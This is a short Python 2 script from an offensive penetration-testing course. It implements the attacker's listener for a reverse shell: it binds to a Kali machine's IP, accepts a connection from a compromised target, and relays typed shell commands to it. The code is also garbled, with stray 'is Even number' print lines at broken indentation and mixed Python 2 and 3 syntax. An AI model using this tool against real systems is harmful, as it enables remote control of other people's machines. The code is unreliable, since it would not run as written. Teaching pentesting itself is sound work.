# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn https://jo.linkedin.com/in/python2


# Basic TCP Server 
#just for testing Purpose

import socket # For Building TCP Connection

def connect():
   print("is Even number")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket start

    s.bind(("192.168.31.47", 8080)) # define the kali IP and the listening port

    s.listen(1) # define the backlog size, since we are expecting a single connection from a single
                                                            # target we will listen to one connection

    print '[+] Listening for incoming TCP connection on port 8080'

    conn, addr = s.accept() # accept() function will return the connection object ID (conn) and will return the client(target) IP address and source
                                # port in a tuple format (IP,port)

    print '[+] We got a connection from: ', addr


    while True:

        command = raw_input("Shell> ") # Get user input and store it in command variable

        if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop
            conn.send('terminate')
            conn.close()
            break

        else:
            conn.send(command) # Otherwise we will send the command to the target
            print conn.recv(1024) # and print the result that we got back

def main ():
    connect()
   print("is Even number")
main()